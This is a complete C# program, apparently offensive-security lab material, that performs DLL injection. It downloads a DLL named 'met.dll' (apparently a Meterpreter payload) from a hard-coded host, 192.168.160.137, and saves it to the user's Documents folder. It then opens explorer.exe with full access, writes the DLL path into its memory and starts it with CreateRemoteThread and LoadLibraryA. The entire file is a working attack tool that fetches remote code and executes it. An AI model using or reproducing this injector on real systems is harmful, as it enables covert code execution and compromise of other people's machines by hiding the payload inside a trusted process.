using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandleW(
            string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // CHANGE! Location of DLL
            String inName = "http://192.168.160.137/met.dll";
            String outDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String outName = outDir + "\\met.dll";
            new WebClient().DownloadFile(inName, outName);

            // Get PID of explorer.exe
            int PID = Process.GetProcessesByName("explorer")[0].Id;

            // Get a handle on a valid process
            IntPtr hProcess = OpenProcess(
                0x001F0FFF,     //PROCESS_ALL_ACCESS
                false,
                PID);

            int path_size = outName.Length;
            // Allocate rwx memory equal to the size of our shellcode in the process
            IntPtr addr = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                (uint)path_size,
                0x3000,     // MEM_COMMIT and MEM_RESERVE
                0x04);      // PAGE_READWRITE

            IntPtr out_size = IntPtr.Zero;
            // Write the shellcode
            WriteProcessMemory(
                hProcess,
                addr,
                Encoding.Default.GetBytes(outName),
                path_size,
                out out_size);

            // Get handle to Kernel32.dll
            IntPtr hKernel32 = GetModuleHandleW("Kernel32");
            IntPtr loadLib = GetProcAddress(hKernel32, "LoadLibraryA");

            // Create a thread to run the DLL   
            IntPtr hThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,    // Default security descriptor
                0,              // Default stack size
                loadLib,
                addr,   // No input variables 
                0,              // Thread runs immediately
                IntPtr.Zero);	// Thread ID
        }
    }
}